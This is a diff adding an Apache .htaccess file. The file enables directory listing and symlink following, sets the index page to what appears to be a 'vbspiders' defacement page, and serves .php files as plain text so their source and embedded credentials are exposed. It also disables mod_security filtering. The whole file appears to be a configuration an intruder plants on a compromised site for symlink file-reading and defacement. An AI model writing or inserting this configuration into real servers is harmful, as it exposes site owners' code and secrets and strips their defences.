@@ -1,0 +1,11 @@
+Options Indexes FollowSymLinks
+DirectoryIndex vbspiders.htm
+AddType txt .php
+AddHandler txt .php
+<IfModule mod_autoindex.c> 
+IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble 
+</ifModule>
+<IfModule mod_security.c> 
+SecFilterEngine Off 
+SecFilterScanPOST Off 
+</IfModule>
